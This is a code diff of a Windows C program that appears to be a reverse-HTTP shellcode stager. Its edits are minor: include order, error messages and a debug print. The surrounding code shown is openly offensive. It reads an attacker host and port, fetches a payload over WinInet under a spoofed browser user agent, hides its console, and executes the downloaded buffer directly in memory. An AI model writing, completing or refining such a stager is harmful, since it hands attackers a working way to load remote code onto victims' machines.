@@ -1,6 +1,6 @@
 #include <WinSock2.h>
-#include <Windows.h>
 #include <Wininet.h>
+#include <Windows.h>
 #include <stdio.h>
 
 #pragma comment(lib, "Ws2_32.lib")
@@ -15,7 +15,7 @@ unsigned int bufSize;
 
 // Functions ...
 void err_exit(char* message){
-	printf("\nError: %s", message);
+	printf("\nError: %s\nGetLastError:%d", message, GetLastError());
 	exit(-1);
 }
 void gen_random(char *s, const int len) { // ripped from http://stackoverflow.com/questions/440133/how-do-i-create-a-random-alpha-numeric-string-in-c
@@ -138,7 +138,7 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	//	   InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
 
 	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
-	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);;
+	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
 	if (hInternetOpen == NULL){
 		err_exit("InternetOpen()");
 	}
@@ -236,6 +236,8 @@ int main()
 	char* LHOST = WcharToChar(szArglist[2]);
 	char* LPORT = WcharToChar(szArglist[3]);
 
+	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);
+
 	// pick transport ...
 	switch (TRANSPORT[0]) {
 	case '0':
@@ -251,7 +253,9 @@ int main()
 		printf(helpText);
 		err_exit("Transport should be 0,1 or 2"); // transport is not 0,1 or 2
 	}
+	
 	FreeConsole();
+
 	(*(void(*)())buf)();
 	err_exit(0);
 }
